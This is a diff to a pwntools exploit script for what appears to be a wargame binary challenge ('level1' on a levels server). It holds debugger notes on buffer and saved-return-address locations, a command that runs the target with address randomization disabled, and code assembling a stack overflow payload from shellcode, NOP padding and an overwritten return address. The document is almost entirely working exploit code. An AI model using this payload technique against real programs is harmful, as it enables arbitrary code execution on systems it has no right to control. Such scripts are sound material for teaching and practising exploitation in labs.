@@ -1,5 +1,7 @@
 from pwn import *
 
+# start with:
+# setarch `arch` -R ./level1 $(echo -n -e \\x6a..)
 # level1@rzt-bin01:/levels$ objdump -f level1
 
 # level1:     file format elf32-i386
@@ -15,13 +17,9 @@ from pwn import *
 # x/10xw $esp
 
 # 0xbffff788:   0xbffff808  0xb7ea1e16  0x00000002  0xbffff834
-# disas 0xb7ea1e16
-# set {int}0x83040 = 4
-
+# disas 0xb7ea1e16,+100
 # buffer location 0xbffff380, 0xbfffef80
 # old eip pos   = 0xbffff78c
-
-# echo -e "\x01\x02..." | ./script
 
 # int main(int argc, char *argv[])
 # {
@@ -58,15 +56,16 @@ shell_hex = enhex(shell_asm)
 shell_len = len(shell_hex) / 2
 
 buf_loc    = 0xbfffef80
-old_eip_pos = 0xbffff388 + 4
+old_eip_pos = 0xbffff38c
 buf_len = old_eip_pos - buf_loc - shell_len
+jmp_loc = buf_loc
 
 print 'buf_len: ', buf_len
 
 def hex_str(h):
     return '%.2x%.2x%.2x%.2x' % (((h >> 0) & 0xff), ((h >> 8) & 0xff), ((h >> 16) & 0xff), ((h >> 24) & 0xff))
 
-ex = shell_hex + '90' * buf_len + hex_str(buf_loc)
+ex = shell_hex + '90' * buf_len + hex_str(jmp_loc)
 # print len(ex), ex
 
 ss = []
